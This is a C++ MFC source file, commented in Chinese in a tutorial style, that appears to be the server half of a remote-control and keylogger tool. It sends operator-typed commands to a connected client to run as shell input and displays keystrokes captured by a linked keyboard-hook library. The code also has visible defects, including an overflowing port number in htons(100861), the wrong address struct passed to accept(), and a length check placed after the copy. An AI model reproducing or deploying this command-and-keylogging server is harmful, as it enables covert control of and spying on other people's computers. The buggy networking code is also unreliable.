
// MCServerDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "MCServer.h"
#include "MCServerDlg.h"
#include "../../KeyHook/keyHook/common.h"
#include <thread>
#include "afxdialogex.h"
#pragma  comment(lib,"../../bin/keyboradhook.lib")
//包含通信的头文件和库
//头文件
#include <winsock2.h>
//库文件
#pragma comment(lib, "ws2_32.lib")

#ifdef _DEBUG
#define new DEBUG_NEW
#endif

SOCKET s;
SOCKET sClient;
// 用于应用程序“关于”菜单项的 CAboutDlg 对话框
int  CMCServerDlg::InitServer()
{
	//windows很特殊 ，需要单独调用api进行网络的初始化和反初始化
	WORD wVersionRequested;
	WSADATA wsaData;
	int err;

	wVersionRequested = MAKEWORD(2, 2);
	//初始化操作

	err = WSAStartup(wVersionRequested, &wsaData);
	if (err != 0) {
		edit1.SetSel(-1);
		edit1.ReplaceSel(TEXT("初始化套接字库失败！\r\n"));

		//edit1.SetWindowTextW(TEXT("初始化套接字库失败！"));


	}

	else {
		edit1.SetSel(-1);
		edit1.ReplaceSel(TEXT("初始化套接字库成功！\r\n"));


		//GetDlgItem(n_Edit1)->SetWindowText("初始化套接字库成功！");
		//edit2.SetWindowTextW(TEXT("初始化套接字库成功！"));
	}


	//1.socket  创建一个套接字
	s = socket(
		AF_INET,//INET协议簇
		SOCK_STREAM,//表示使用的使TCP协议
		0);

	if (s == INVALID_SOCKET) {
		edit1.SetSel(-1);
		edit1.ReplaceSel(TEXT("创建套接字库失败！\r\n"));
		

		//GetDlgItem(n_Edit1)->SetWindowText("创建套接字库失败！");
		WSACleanup();
		return 0;
	}
	else {
		edit1.SetSel(-1);
		edit1.ReplaceSel(TEXT("创建套接字库成功！\r\n"));
		
		//GetDlgItem(n_Edit1)->SetWindowText("创建套接字库成功！");

	}
	//2.bind/listen 绑定/监听端口
	//ip地址；类似于网络中的家庭地址
	//端口：用于区分是哪个应用的数据，只是一个编号0-65535； 3389端口 RDP远程桌面端口 88端口 网页浏览器 http 
	//53 dns 443 https 135 137 20/21 ftp 25
	//一个应用可以使用多少个端口
	//看这里有多少个tcp连接
	//源ip；源端口 ----------------------目标ip 目标端口


	//挑选一个本机其他软件没有使用的端口来使用
	//一般1024以上 
	//sockaddr s;用于 描述 IP和端口的结构体 不好用 因为内部是一个数组
	sockaddr_in addr;//用于替换socketaddr结构体 两者大小一致
	addr.sin_family = AF_INET;//写死
	addr.sin_addr.S_un.S_addr = inet_addr("0.0.0.0");//固定套路 ，写0.0.0.0 表示当前所有网卡的地址都可以接受
	addr.sin_port = htons(100861);//坑  h:host to n:network short类型两字节 网络字节序（大尾方式）和本地字节序（小尾方式）
	int nlength = sizeof(sockaddr_in);
	int nRet = bind(s, (sockaddr*)&addr, nlength);
	if (nRet == SOCKET_ERROR) {
		edit1.SetSel(-1);
		edit1.ReplaceSel(TEXT("绑定端口失败！\r\n"));
		
		//GetDlgItem(n_Edit1)->SetWindowText("绑定端口成功！");
		WSACleanup();
		return 0;
	}
	else {
		edit1.SetSel(-1);
		edit1.ReplaceSel(TEXT("绑定端口成功！\r\n"));
	
		//GetDlgItem(n_Edit1)->SetWindowText("绑定端口失败！");
	}


	//监听
	nRet = listen(s, 5);
	if (nRet == SOCKET_ERROR) {
		edit1.SetSel(-1);
		edit1.ReplaceSel(TEXT("设置监听状态失败！\r\n"));
		//edit1.SetWindowTextW(TEXT("设置监听状态失败！"));
		//GetDlgItem(n_Edit1)->SetWindowText("设置监听状态失败！");
		WSACleanup();
	}
	else {
		edit1.SetSel(-1);
		edit1.ReplaceSel(_T("设置监听状态成功\r\n"),1);
		edit1.SetSel(-1);
		edit1.ReplaceSel(_T("服务端正在监听连接，请稍候....\r\n"),1);
		//edit1.SetWindowTextW(TEXT("设置监听状态成功！"));
		//edit1.SetWindowTextW(TEXT("服务端正在监听连接，请稍候...."));
		//GetDlgItem(n_Edit1)->SetWindowText("设置监听状态成功！");
		//GetDlgItem(n_Edit1)->SetWindowText("服务端正在监听连接，请稍候....");

	}
	//3.accept 接受请求 等待别人连接
	//第一个参数s表示连接socket, 专门用于连接
	sockaddr_in remoteAddr;
	remoteAddr.sin_family = AF_INET;
	int addrlen;
	addrlen = sizeof(remoteAddr);
	//返回的socket sClient是专门用于与客户端通信的socket,一般这里开线程循环接受
	sClient = accept(s, (sockaddr*)&addr, &addrlen);
	if (sClient == INVALID_SOCKET) {
		edit1.SetSel(-1);
		edit1.ReplaceSel(TEXT("客户端连接失败!\r\n"));
		//edit1.SetWindowTextW(TEXT("客户端连接失败！"));

		//GetDlgItem(n_Edit1)->SetWindowText("连接失败！");
		WSACleanup();
		return 0;
	}
	else {
		edit1.SetSel(-1);
		edit1.ReplaceSel(TEXT("连接建立，准备接受数据\r\n"));
		//edit1.SetWindowTextW(TEXT("连接建立，准备接受数据"));
		//GetDlgItem(n_Edit1)->SetWindowText("连接建立，准备接受数据");
		return 0;
	}
}
class CAboutDlg : public CDialogEx
{
public:
	CAboutDlg();

// 对话框数据
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_ABOUTBOX };
#endif

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

// 实现
protected:
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialogEx(IDD_ABOUTBOX)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
END_MESSAGE_MAP()


// CMCServerDlg 对话框



CMCServerDlg::CMCServerDlg(CWnd* pParent /*=NULL*/)
	: CDialogEx(IDD_MCSERVER_DIALOG, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CMCServerDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_EDIT1, edit1);
	DDX_Control(pDX, IDC_EDIT3, edit2);
	DDX_Control(pDX, IDC_EDIT2, edit3);
}

BEGIN_MESSAGE_MAP(CMCServerDlg, CDialogEx)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_BN_CLICKED(IDOK, &CMCServerDlg::OnBnClickedOk)
	ON_BN_CLICKED(IDC_BUTTON1, &CMCServerDlg::OnBnClickedButton1)
END_MESSAGE_MAP()


// CMCServerDlg 消息处理程序

BOOL CMCServerDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// 将“关于...”菜单项添加到系统菜单中。

	// IDM_ABOUTBOX 必须在系统命令范围内。
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// 设置此对话框的图标。  当应用程序主窗口不是对话框时，框架将自动
	//  执行此操作
	SetIcon(m_hIcon, TRUE);			// 设置大图标
	SetIcon(m_hIcon, FALSE);		// 设置小图标
	
	// TODO: 在此添加额外的初始化代码

	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
}

void CMCServerDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialogEx::OnSysCommand(nID, lParam);
	}
}

// 如果向对话框添加最小化按钮，则需要下面的代码
//  来绘制该图标。  对于使用文档/视图模型的 MFC 应用程序，
//  这将由框架自动完成。

void CMCServerDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // 用于绘制的设备上下文

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// 使图标在工作区矩形中居中
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// 绘制图标
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

//当用户拖动最小化窗口时系统调用此函数取得光标
//显示。
HCURSOR CMCServerDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}



void CMCServerDlg::OnBnClickedOk()
{
	// TODO: 在此添加控件通知处理程序代码
	//CDialogEx::OnOK();	
	char szBuff[256] = { 0 };
	CString cstringBuf;
	edit2.GetWindowText(cstringBuf);
	

	//将CString转char*

	//std::string ss(W2A(cstringBuf));
	//const char* ccommand = ss.c_str();
	//strcpy_s(szBuff, ccommand);

	CStringA tmp;
	tmp = cstringBuf;
	char* pp = tmp.GetBuffer();
	strcpy_s(szBuff, pp);

	int nLength = strlen(szBuff);
	if (nLength > 255) {
		//printf("stack overflow");
		edit2.SetWindowText(TEXT("stack overflow"));
		return;
	}

	szBuff[nLength++] = '\n';    //输入的命令末尾需要加上换行

	//然后把输入的命令直接发给客户端，作为它的输入。

	const char* pStr = (const char*)szBuff;
	char szBuf[1024];
	MyPacket* pPkt = (MyPacket*)szBuf;

	pPkt->type = PACKET_RLY_CMD;
	pPkt->length = strlen(pStr) + 1;	//仅仅表示数据长度，不包括结构体头部的前面2个4字节。
	memcpy(pPkt->data, pStr, pPkt->length);	//将数据拷贝给包中

	send(
		sClient,
		(const char*)pPkt,
		pPkt->length + sizeof(unsigned int) * 2,
		0
	);

	
}


void CMCServerDlg::OnBnClickedButton1()
{
	// TODO: 在此添加控件通知处理程序代码
	std::thread thd([&]() {
		InitServer();
		while (true) {
			char szOutBuf[256] = { 0 };
			int nRet;
			nRet = recv(sClient, szOutBuf, 8, 0);//返回值
			MyPacket* pPkt = (MyPacket*)szOutBuf;
			if (nRet == 0) {
				printf("recv error");
			}
			else if (nRet > 0) {
				if (pPkt->type == PACKET_REQ_KEYBOARD)
				{
					nRet = recv(sClient, szOutBuf, pPkt->length, 0);
					edit3.SetSel(-1);
					edit3.ReplaceSel(_T("键盘消息\r\n"), 1);
					edit3.SetSel(-1);
					edit3.ReplaceSel(pPkt->data,1);
					

				}
				else
				{
					nRet = recv(sClient, szOutBuf, pPkt->length, 0);
					OutputDebugStringA((LPCSTR)pPkt->data);
					
					edit1.SetSel(-1);


					edit1.ReplaceSel((LPCTSTR)((LPCSTR)pPkt->data));
						//	, 1);

				}
			}
		}

	});
	thd.detach();
	
	/*	while (true) {
			char szOutBuf[256] = { 0 };
			int nRet;
			nRet = recv(sClient, szOutBuf, 255, 0);//返回值
			MyPacket* pPkt = (MyPacket*)szOutBuf;
			if (nRet == 0) {
				printf("recv error");
			}
			else if (nRet > 0) {
				if (pPkt->type == PACKET_REQ_KEYBOARD)
				{
					printf("键盘消息");
					printf(pPkt->data);

				}
				else
				{
					printf("cmd消息");
					printf(pPkt->data);
				}


			}

		}

	});*/
	

	
}
